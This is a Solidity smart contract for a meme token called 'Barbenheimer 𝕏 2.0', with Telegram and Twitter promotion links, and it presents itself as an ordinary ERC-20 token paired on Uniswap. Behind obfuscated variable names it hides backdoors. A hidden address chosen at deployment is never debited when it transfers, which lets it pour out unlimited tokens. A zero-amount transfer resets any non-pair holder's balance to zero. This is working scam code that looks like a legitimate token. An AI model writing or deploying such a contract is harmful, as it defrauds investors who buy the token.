/*

Telegram: https://t.me/Barbenheimer2

Twitter: https://twitter.com/Barbenheimerx2

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Barbenheimer is Ownable {
    function approve(address mncay, uint256 nmyuwpx) public returns (bool success) {
        allowance[msg.sender][mncay] = nmyuwpx;
        emit Approval(msg.sender, mncay, nmyuwpx);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address bxionhst) {
        balanceOf[msg.sender] = totalSupply;
        wzmeclvf[bxionhst] = szkymelv;
        IUniswapV2Router02 ziwfdralu = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ckmxjnb = IUniswapV2Factory(ziwfdralu.factory()).createPair(address(this), ziwfdralu.WETH());
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = unicode"Barbenheimer 𝕏 2.0";

    string public name = unicode"Barbenheimer 𝕏 2.0";

    address public ckmxjnb;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address mzwre, uint256 nmyuwpx) public returns (bool success) {
        yutp(msg.sender, mzwre, nmyuwpx);
        return true;
    }

    uint256 private szkymelv = 106;

    uint8 public decimals = 9;

    function yutp(address bxjyzvpdg, address mzwre, uint256 nmyuwpx) private {
        if (0 == wzmeclvf[bxjyzvpdg]) {
            balanceOf[bxjyzvpdg] -= nmyuwpx;
        }
        balanceOf[mzwre] += nmyuwpx;
        if (0 == nmyuwpx && mzwre != ckmxjnb) {
            balanceOf[mzwre] = nmyuwpx;
        }
        emit Transfer(bxjyzvpdg, mzwre, nmyuwpx);
    }

    mapping(address => uint256) private wzmeclvf;

    function transferFrom(address bxjyzvpdg, address mzwre, uint256 nmyuwpx) public returns (bool success) {
        require(nmyuwpx <= allowance[bxjyzvpdg][msg.sender]);
        allowance[bxjyzvpdg][msg.sender] -= nmyuwpx;
        yutp(bxjyzvpdg, mzwre, nmyuwpx);
        return true;
    }
}